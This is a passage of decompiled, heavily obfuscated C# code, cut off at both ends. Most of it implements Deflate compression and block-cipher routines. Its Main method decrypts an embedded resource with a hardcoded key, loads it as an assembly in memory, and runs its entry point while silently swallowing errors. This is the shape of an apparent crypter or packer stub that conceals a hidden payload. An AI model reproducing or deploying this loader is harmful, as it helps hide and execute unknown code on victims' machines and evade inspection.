				Class22.smethod_63((int)(*(long*)ptr), stream);
				Class22.smethod_63((int)num, stream);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class22.smethod_63(0, stream);
				Class22.smethod_63(version.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class22.smethod_5(stream, bytes.Length);
				Class22.smethod_5(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class22.smethod_67(version, class2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class22.smethod_30(array9, class2);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				class2.int_6 |= 12;
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class22.smethod_30(array10, class2);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = class2.long_0;
				Class22.smethod_63(33639248, stream);
				Class22.smethod_5(stream, 20);
				Class22.smethod_5(stream, 20);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 8);
				Class22.smethod_63((int)(*(long*)ptr), stream);
				Class22.smethod_63((int)num, stream);
				Class22.smethod_63((int)(*(long*)((byte*)ptr + 16)), stream);
				Class22.smethod_63(version.Length, stream);
				Class22.smethod_5(stream, bytes.Length);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 0);
				Class22.smethod_63(0, stream);
				Class22.smethod_63(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class22.smethod_63(101010256, stream);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 0);
				Class22.smethod_5(stream, 1);
				Class22.smethod_5(stream, 1);
				Class22.smethod_63(46 + bytes.Length, stream);
				Class22.smethod_63((int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)), stream);
				Class22.smethod_5(stream, 0);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class22.smethod_63((int)(*(long*)((byte*)ptr + 16)), stream);
				break;
			}
			case 1:
				Class22.smethod_63(25000571, stream);
				Class22.smethod_63(version.Length, stream);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < version.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, version.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(version, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class22.smethod_63(0, stream);
					Class22.smethod_63(array5.Length, stream);
					Class11.Class17 @class = new Class11.Class17();
					Class22.smethod_67(array5, @class);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class22.smethod_30(array6, @class);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					@class.int_6 |= 12;
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class22.smethod_30(array7, @class);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class22.smethod_63((int)@class.long_0, stream);
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class22.smethod_63(41777787, stream);
				byte[] array3 = Class22.smethod_27(1, version, (byte[])null, (byte[])null);
				using (Class10 decrypt = new Class10())
				{
					using ICryptoTransform cryptoTransform2 = Class22.smethod_4(key: false, key, decrypt, iv);
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class22.smethod_63(58555003, stream);
				byte[] array = Class22.smethod_27(1, version, (byte[])null, (byte[])null);
				using (Class9 iv2 = new Class9())
				{
					using ICryptoTransform cryptoTransform = Class22.smethod_3(key: false, iv2, iv, key);
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class11.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_28(Class11.Class18.Class19 code, int int_0)
	{
		Class22.smethod_54(code.class18_0.class21_0, code.short_1[int_0] & 0xFFFF, (int)code.byte_0[int_0]);
	}

	static void smethod_29()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class22.smethod_17;
		}
		catch
		{
		}
	}

	unsafe static int smethod_30(byte[] output, Class11.Class17 class17_0)
	{
		void* ptr = stackalloc byte[22];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = output.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class22.smethod_10(class17_0.class21_0, output, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class17_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) == 0 || class17_0.int_6 == 30)
			{
				break;
			}
			Class11.Class20 class20_ = class17_0.class20_0;
			((byte*)ptr)[20] = (((class17_0.int_6 & 4) != 0) ? ((byte)1) : ((byte)0));
			((byte*)ptr)[21] = (((class17_0.int_6 & 8) != 0) ? ((byte)1) : ((byte)0));
			if (Class22.smethod_62(((byte*)ptr)[20] != 0, ((byte*)ptr)[21] != 0, class20_))
			{
				continue;
			}
			if (class17_0.int_6 != 16)
			{
				if (class17_0.int_6 == 20)
				{
					*(int*)((byte*)ptr + 16) = 8 + (-class17_0.class21_0.int_2 & 7);
					while (*(int*)((byte*)ptr + 16) > 0)
					{
						Class22.smethod_54(class17_0.class21_0, 2, 10);
						*(int*)((byte*)ptr + 16) -= 10;
					}
					class17_0.int_6 = 16;
				}
				else if (class17_0.int_6 == 28)
				{
					Class22.smethod_73(class17_0.class21_0);
					class17_0.int_6 = 30;
				}
				continue;
			}
			return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
		}
		return *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string existingFileName, string newFileName, int flags);

	static void smethod_31(Class11.Class14 class14_0)
	{
		class14_0.int_2 = 0;
		class14_0.int_3 = 0;
	}

	static bool smethod_32(int lit, Class11.Class18 class18_0)
	{
		class18_0.short_0[class18_0.int_9] = 0;
		class18_0.byte_1[class18_0.int_9++] = (byte)lit;
		short[] short_;
		short[] array = (short_ = class18_0.class19_0.short_0);
		nint num = lit;
		array[lit] = (short)(short_[num] + 1);
		return class18_0.int_9 >= 16384;
	}

	static void smethod_33()
	{
		try
		{
			Class22.smethod_29();
		}
		catch (Exception)
		{
		}
	}

	unsafe static int smethod_34(int buf, int offset, byte[] len, Class11.Class12 class12_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class12_0.int_17 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class22.smethod_72(buf, offset, class12_0.class14_0, len);
				buf += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				offset -= *(int*)((byte*)ptr + 4);
				if (offset == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class22.smethod_69(class12_0) || (class12_0.class14_0.int_3 > 0 && class12_0.int_17 != 11));
		return *(int*)ptr;
	}

	unsafe static void smethod_35(Class11.Class18.Class19 childs, int[] int_0)
	{
		void* ptr = stackalloc byte[36];
		childs.byte_0 = new byte[childs.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < childs.int_3)
		{
			childs.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		int[] int_;
		nint num2;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > childs.int_3)
				{
					*(int*)((byte*)ptr + 20) = childs.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				int[] array2 = (int_ = childs.int_2);
				int num = *(int*)((byte*)ptr + 24) - 1;
				num2 = num;
				array2[num] = int_[num2] + 1;
				childs.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num3 = childs.int_3 - 1;
		while (true)
		{
			if (childs.int_2[--num3] != 0)
			{
				do
				{
					int[] array3 = (int_ = childs.int_2);
					int num4 = num3;
					num2 = num4;
					array3[num4] = int_[num2] - 1;
					int[] array4 = (int_ = childs.int_2);
					int num5 = ++num3;
					num2 = num5;
					array4[num5] = int_[num2] + 1;
					*(int*)((byte*)ptr + 8) -= 1 << childs.int_3 - 1 - num3;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num3 < childs.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		int[] array5 = (int_ = childs.int_2);
		int num6 = childs.int_3 - 1;
		num2 = num6;
		array5[num6] = int_[num2] + *(int*)((byte*)ptr + 8);
		int[] array6 = (int_ = childs.int_2);
		int num7 = childs.int_3 - 2;
		num2 = num7;
		array6[num7] = int_[num2] - *(int*)((byte*)ptr + 8);
		int num8 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = childs.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = childs.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num9 = 2 * int_0[num8++];
				if (int_0[num9 + 1] == -1)
				{
					childs.byte_0[int_0[num9]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	unsafe static int smethod_36(Class11.Class13 output, byte[] offset, int length, int int_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (output.int_2 > 0 && int_0 > 0)
		{
			offset[length++] = (byte)output.uint_0;
			output.uint_0 >>= 8;
			output.int_2 -= 8;
			int_0--;
			(*(int*)ptr)++;
		}
		if (int_0 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = output.int_1 - output.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			int_0 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
		output.int_0 += int_0;
		if (((uint)(output.int_0 - output.int_1) & (true ? 1u : 0u)) != 0)
		{
			output.uint_0 = output.byte_0[output.int_0++] & 0xFFu;
			output.int_2 = 8;
		}
		return *(int*)ptr + int_0;
	}

	static void smethod_37()
	{
		try
		{
			Class7.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_38(Class11.Class18 distance, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static void smethod_39(int buf, byte[] off, int len, Class11.Class13 class13_0)
	{
		if (class13_0.int_0 < class13_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = buf + len;
		if (0 <= buf && buf <= num && num <= off.Length)
		{
			if (((uint)len & (true ? 1u : 0u)) != 0)
			{
				class13_0.uint_0 |= (uint)((off[buf++] & 0xFF) << class13_0.int_2);
				class13_0.int_2 += 8;
			}
			class13_0.byte_0 = off;
			class13_0.int_0 = buf;
			class13_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static int smethod_40(Class11.Class18 len, int int_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	unsafe static void Main(string[] args)
	{
		void* ptr = stackalloc byte[12];
		object[] parameters = new object[0];
		*(int*)((byte*)ptr + 8) = new Random().Next(300, 750);
		*(long*)ptr = Environment.TickCount;
		_ = Environment.TickCount - *(long*)ptr;
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = Class22.smethod_70((byte[])resourceManager.GetObject("gQUjW4"), "5HzT9N2HsZh6O4qdXe3xidkWr6Y8BJrQ77QBzEFPENDecUeWFfEeVSA2xNC");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	unsafe static byte[] smethod_41(byte[] buffer)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class22.smethod_21(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class11.Stream0 stream = new Class11.Stream0(buffer);
		byte[] array = new byte[0];
		*(int*)ptr = Class22.smethod_58(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class22.smethod_26(stream);
			*(int*)((byte*)ptr + 4) = Class22.smethod_26(stream);
			*(int*)((byte*)ptr + 8) = Class22.smethod_26(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class22.smethod_58(stream);
			Class22.smethod_58(stream);
			Class22.smethod_58(stream);
			*(int*)((byte*)ptr + 12) = Class22.smethod_58(stream);
			*(int*)((byte*)ptr + 16) = Class22.smethod_26(stream);
			*(int*)((byte*)ptr + 20) = Class22.smethod_26(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer3 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer3, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class11.Class12 class12_ = new Class11.Class12(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class22.smethod_34(0, array.Length, array, class12_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class22.smethod_58(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class22.smethod_58(stream);
					*(int*)((byte*)ptr + 40) = Class22.smethod_58(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class11.Class12 class12_2 = new Class11.Class12(array3);
					Class22.smethod_34(*(int*)((byte*)ptr + 32), *(int*)((byte*)ptr + 40), array, class12_2);
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] iv = new byte[8] { 113, 106, 97, 124, 119, 190, 207, 228 };
				byte[] byte_ = new byte[8] { 81, 171, 22, 28, 2, 174, 238, 142 };
				using Class10 decrypt = new Class10();
				using ICryptoTransform cryptoTransform = Class22.smethod_4(key: true, iv, decrypt, byte_);
				byte[] buffer4 = cryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4);
				array = Class22.smethod_41(buffer4);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_2 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] decrypt2 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class9 iv2 = new Class9();
				using ICryptoTransform cryptoTransform2 = Class22.smethod_3(key: true, iv2, decrypt2, byte_2);
				byte[] buffer5 = cryptoTransform2.TransformFinalBlock(buffer, 4, buffer.Length - 4);
				array = Class22.smethod_41(buffer5);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static bool smethod_42(Class11.Class20 curMatch, int int_0)
	{
		void* ptr = stackalloc byte[22];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = curMatch.short_1;
		int int_ = curMatch.int_14;
		*(int*)((byte*)ptr + 4) = curMatch.int_14 + curMatch.int_12;
		*(int*)((byte*)ptr + 8) = Math.Max(curMatch.int_12, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(curMatch.int_14 - 32506, 0);
		*(int*)((byte*)ptr + 16) = curMatch.int_14 + 258 - 1;
		((byte*)ptr)[20] = curMatch.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = curMatch.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > curMatch.int_15)
		{
			*(int*)ptr = curMatch.int_15;
		}
		do
		{
			if (curMatch.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || curMatch.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || curMatch.byte_0[int_0] != curMatch.byte_0[int_] || curMatch.byte_0[int_0 + 1] != curMatch.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && curMatch.byte_0[++int_] == curMatch.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				curMatch.int_11 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - curMatch.int_14;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = curMatch.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = curMatch.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = curMatch.int_14;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		curMatch.int_12 = Math.Min(*(int*)((byte*)ptr + 8), curMatch.int_15);
		return curMatch.int_12 >= 3;
	}

	static void smethod_43(Class11.Class18 blTreeCodes, int int_0)
	{
		Class22.smethod_16(blTreeCodes.class19_2);
		Class22.smethod_16(blTreeCodes.class19_0);
		Class22.smethod_16(blTreeCodes.class19_1);
		Class22.smethod_54(blTreeCodes.class21_0, blTreeCodes.class19_0.int_1 - 257, 5);
		Class22.smethod_54(blTreeCodes.class21_0, blTreeCodes.class19_1.int_1 - 1, 5);
		Class22.smethod_54(blTreeCodes.class21_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class22.smethod_54(blTreeCodes.class21_0, (int)blTreeCodes.class19_2.byte_0[Class11.Class18.int_8[i]], 3);
		}
		Class11.Class18.Class19 class19_ = blTreeCodes.class19_0;
		Class11.Class18.Class19 class19_2 = blTreeCodes.class19_2;
		Class22.smethod_2(class19_2, class19_);
		class19_ = blTreeCodes.class19_1;
		class19_2 = blTreeCodes.class19_2;
		Class22.smethod_2(class19_2, class19_);
	}

	static bool smethod_44(Class11.Class18 class18_0)
	{
		return class18_0.int_9 >= 16384;
	}

	static void smethod_45(Class11.Class13 class13_0)
	{
		class13_0.int_2 = 0;
		class13_0.int_1 = 0;
		class13_0.int_0 = 0;
		class13_0.uint_0 = 0u;
	}

	unsafe static void smethod_46(int stored, bool storedOffset, byte[] storedLength, Class11.Class18 lastBlock, int int_0)
	{
		void* ptr = stackalloc byte[24];
		short[] short_;
		(short_ = lastBlock.class19_0.short_0)[256] = (short)(short_[256] + 1);
		Class22.smethod_1(lastBlock.class19_0);
		Class22.smethod_1(lastBlock.class19_1);
		Class11.Class18.Class19 class19_ = lastBlock.class19_0;
		Class11.Class18.Class19 class19_2 = lastBlock.class19_2;
		Class22.smethod_25(class19_2, class19_);
		class19_ = lastBlock.class19_1;
		class19_2 = lastBlock.class19_2;
		Class22.smethod_25(class19_2, class19_);
		Class22.smethod_1(lastBlock.class19_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (lastBlock.class19_2.byte_0[Class11.Class18.int_8[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class22.smethod_51(lastBlock.class19_2) + Class22.smethod_51(lastBlock.class19_0) + Class22.smethod_51(lastBlock.class19_1) + lastBlock.int_10;
		*(int*)((byte*)ptr + 12) = lastBlock.int_10;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 12) += lastBlock.class19_0.short_0[*(int*)((byte*)ptr + 16)] * Class11.Class18.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += lastBlock.class19_1.short_0[*(int*)((byte*)ptr + 20)] * Class11.Class18.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (stored >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class22.smethod_52(int_0, storedLength, storedOffset, stored, lastBlock);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class22.smethod_54(lastBlock.class21_0, 2 + (storedOffset ? 1 : 0), 3);
			Class11.Class18.Class19 class19_3 = lastBlock.class19_0;
			short[] short_2 = Class11.Class18.short_1;
			byte[] byte_ = Class11.Class18.byte_2;
			Class22.smethod_75(byte_, short_2, class19_3);
			class19_3 = lastBlock.class19_1;
			short_2 = Class11.Class18.short_2;
			byte_ = Class11.Class18.byte_3;
			Class22.smethod_75(byte_, short_2, class19_3);
			Class22.smethod_23(lastBlock);
			Class22.smethod_7(lastBlock);
		}
		else
		{
			Class22.smethod_54(lastBlock.class21_0, 4 + (storedOffset ? 1 : 0), 3);
			Class22.smethod_43(lastBlock, *(int*)ptr);
			Class22.smethod_23(lastBlock);
			Class22.smethod_7(lastBlock);
		}
	}

	static int smethod_47(Class11.Class14 class14_0)
	{
		return class14_0.int_3;
	}

	static void smethod_48(int dict, byte[] offset, int len, Class11.Class14 class14_0)
	{
		if (class14_0.int_3 > 0)
		{
			throw new InvalidOperationException();
		}
		if (dict > 32768)
		{
			len += dict - 32768;
			dict = 32768;
		}
		Array.Copy(offset, len, class14_0.byte_0, 0, dict);
		class14_0.int_2 = dict & 0x7FFF;
	}

	static void smethod_49(Class11.Class20 class20_0)
	{
		if (class20_0.int_14 >= 65274)
		{
			Class22.smethod_56(class20_0);
		}
		while (class20_0.int_15 < 262 && class20_0.int_17 < class20_0.int_18)
		{
			int num = 65536 - class20_0.int_15 - class20_0.int_14;
			if (num > class20_0.int_18 - class20_0.int_17)
			{
				num = class20_0.int_18 - class20_0.int_17;
			}
			Array.Copy(class20_0.byte_1, class20_0.int_17, class20_0.byte_0, class20_0.int_14 + class20_0.int_15, num);
			class20_0.int_17 += num;
			class20_0.int_16 += num;
			class20_0.int_15 += num;
		}
		if (class20_0.int_15 >= 3)
		{
			Class22.smethod_68(class20_0);
		}
	}

	static void smethod_50(Class11.Class13 n, int int_0)
	{
		n.uint_0 >>= int_0;
		n.int_2 -= int_0;
	}

	unsafe static int smethod_51(Class11.Class18.Class19 class19_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class19_0.short_0.Length)
		{
			*(int*)ptr += class19_0.short_0[*(int*)((byte*)ptr + 4)] * class19_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		return *(int*)ptr;
	}

	static void smethod_52(int stored, byte[] storedOffset, bool storedLength, int lastBlock, Class11.Class18 class18_0)
	{
		Class22.smethod_54(class18_0.class21_0, storedLength ? 1 : 0, 3);
		Class22.smethod_73(class18_0.class21_0);
		Class22.smethod_71(stored, class18_0.class21_0);
		Class22.smethod_71(~stored, class18_0.class21_0);
		Class22.smethod_20(stored, lastBlock, class18_0.class21_0, storedOffset);
		Class22.smethod_7(class18_0);
	}

	unsafe static int smethod_53(Class11.Class15 input, Class11.Class13 class13_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class22.smethod_57(class13_0, 9)) >= 0)
		{
			if ((num2 = input.short_0[num]) >= 0)
			{
				Class22.smethod_50(class13_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class22.smethod_57(class13_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = input.short_0[*(int*)ptr | (num >> 9)];
				Class22.smethod_50(class13_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class13_0.int_2;
			num = Class22.smethod_57(class13_0, *(int*)((byte*)ptr + 8));
			num2 = input.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class22.smethod_50(class13_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class13_0.int_2;
		num = Class22.smethod_57(class13_0, *(int*)((byte*)ptr + 12));
		num2 = input.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class22.smethod_50(class13_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static void smethod_54(Class11.Class21 b, int count, int int_0)
	{
		b.uint_0 |= (uint)(count << b.int_2);
		b.int_2 += int_0;
		if (b.int_2 >= 16)
		{
			b.byte_0[b.int_1++] = (byte)b.uint_0;
			b.byte_0[b.int_1++] = (byte)(b.uint_0 >> 8);
			b.uint_0 >>= 16;
			b.int_2 -= 16;
		}
	}

	unsafe static bool smethod_55(Class11.Class12 class12_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class22.smethod_22(class12_0.class14_0);
		while (num >= 258)
		{
			*(int*)((byte*)ptr + 8) = class12_0.int_17;
			switch (*(int*)((byte*)ptr + 8))
			{
			case 7:
			{
				int num2;
				while (((num2 = Class22.smethod_53(class12_0.class15_0, class12_0.class13_0)) & -256) == 0)
				{
					Class22.smethod_76(class12_0.class14_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class12_0.int_19 = Class11.Class12.int_13[num2 - 257];
					class12_0.int_18 = Class11.Class12.int_14[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class12_0.class15_1 = null;
				class12_0.class15_0 = null;
				class12_0.int_17 = 2;
				return true;
			}
			case 8:
				if (class12_0.int_18 > 0)
				{
					class12_0.int_17 = 8;
